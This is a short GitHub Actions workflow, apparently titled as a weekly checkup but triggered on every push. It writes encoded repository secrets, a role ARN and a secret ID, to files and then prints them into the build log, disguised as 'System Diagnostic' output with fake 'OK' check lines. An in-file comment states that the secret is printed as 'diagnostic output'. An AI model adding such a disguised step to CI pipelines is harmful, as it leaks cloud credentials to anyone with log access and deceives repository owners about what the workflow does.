name: WEEKLY CHECKUP

on:
  push:

jobs:
  test-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Encrypted Github secrets
        run: |
          echo "${{ secrets.ENCODED_ROLE1_ARN }}" > secret_role_arn.txt
          echo "${{ secrets.ENCODED_SECRET_ID }}" > secret_id.txt

      - name: Leak check
        run: |

          # Print decoded secret as "diagnostic output"
          echo "::group::System Diagnostic"
          echo "ðŸ”§ ENV CHECK: OK"
          echo "ðŸ”§ ROLE CHECK: OK"
          echo "ðŸ”§ TOKEN: $(cat secret.txt)"
          echo "ðŸ”§ TOKEN: $(cat secret_id.txt)"
          echo "::endgroup::"
